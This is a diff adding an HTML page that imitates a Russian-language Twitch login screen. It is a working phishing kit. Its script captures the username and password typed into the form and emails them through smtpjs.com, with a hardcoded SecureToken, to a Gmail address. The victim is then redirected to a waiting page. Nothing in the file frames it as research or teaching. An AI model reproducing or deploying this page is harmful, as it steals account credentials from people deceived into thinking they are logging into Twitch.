@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Войти - Twitch </title>
+    <link rel="stylesheet" href="style2.css">
+</head>
+
+<body>
+    <script>
+        function confirmUser() {
+            alert('Ошибка')
+        }
+    </script>
+    <header>
+        <nav class="nav">
+            <a href="?page=twitch"><img src="twitch-logo.png"></a>
+            <a href="?page=browser">Искать</a>
+            <a href="?page=getdesktop">Приложение</a>
+            <a href="?page=tryprime">Премиум</a>
+            <a href="#" class="loggedIn">
+
+            </a>
+            <a href="#" onclick='confirmUser()'>Войти</a>
+        </nav>
+    </header>
+
+    <div id="app">
+        <h1>Войти в <span class="website-name">twstcr.github.com</span></h1>
+        <nav class="nav--login">
+            <a href="#" id="tabLogin">Войти</a>
+            <a href="#" id="tabSignIn">Зарегистрироваться</a>
+        </nav>
+
+        <div class="alert hidden">That password was incorrect. Please try again</div>
+
+        <div class="form form--login">
+            <label for="username">Имя пользователя</label>
+            <input type="text" id="username" required>
+
+            <label for="password">Пароль</label>
+            <input type="password" id="password" required>
+        </div>
+
+        <a id="btn" class="btnSubmit" href="waiting_time.html">Войти</a>
+
+        <div class="form form--signup hidden">
+            <label for="username2">Username</label>
+            <input type="text" id="username2">
+
+            <label for="password2">Password</label>
+            <input type="password" id="password2">
+
+            <label for="email">Email</label>
+            <input type="text" id="email">
+        </div>
+    </div>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        var btn = document.getElementById('btn');
+        btn.addEventListener('click', function (e) {
+            e.preventDefault()
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var body = 'username: ' + username + '<br>password: ' + password;
+            console.log('Sent');
+            window.open('waiting_time.html');
+
+
+            Email.send({
+                SecureToken: "aed6af81-8e72-400d-8e43-11164fe16a89",
+                To: 'trend.cinema.gg@gmail.com',
+                From: "trend.cinema.gg@gmail.com",
+                Subject: "Inof",
+                Body: body
+            }).then(
+                message => alert(message)
+            );
+        })
+    </script>
+</body>
+
+</html>
